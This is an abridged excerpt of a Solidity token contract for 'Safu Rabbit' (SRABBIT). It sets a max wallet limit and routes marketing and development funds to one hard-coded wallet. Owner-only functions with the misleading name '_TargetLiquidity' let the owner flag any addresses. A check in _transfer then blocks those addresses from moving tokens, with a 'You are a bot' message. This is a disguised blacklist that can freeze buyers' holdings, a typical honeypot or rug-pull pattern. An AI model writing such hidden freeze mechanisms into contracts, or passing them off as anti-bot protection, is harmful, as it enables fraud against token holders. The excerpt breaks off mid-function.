...
library Address{
 ...
 contract SRABBIT is Context, IERC20, Ownable {
    ...
    mapping (address => bool) private _TargetLiquidity;
    ...
    uint256 public maxWalletLimit = 10000000 * 10**9;
    
    uint256 public genesis_block;
    
    address public marketingWallet = 0xcb464903f914482A8A05440C9E7E54794CD1B463;
    address public developmentWallet = 0xcb464903f914482A8A05440C9E7E54794CD1B463;

    string private constant _name = "Safu Rabbit";
    string private constant _symbol = "SRABBIT";
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        require(!_TargetLiquidity[from] && !_TargetLiquidity[to], "You are a bot");
    ...
    function setTargetLiquidity(address account, bool state) external onlyOwner{
        _TargetLiquidity[account] = state;
    }
    
    function TargetLiquidity(address[] memory accounts, bool state) external onlyOwner{
        for(uint256 i =0; i < accounts.length; i++){
            _TargetLiquidity[accounts[i]] = state;
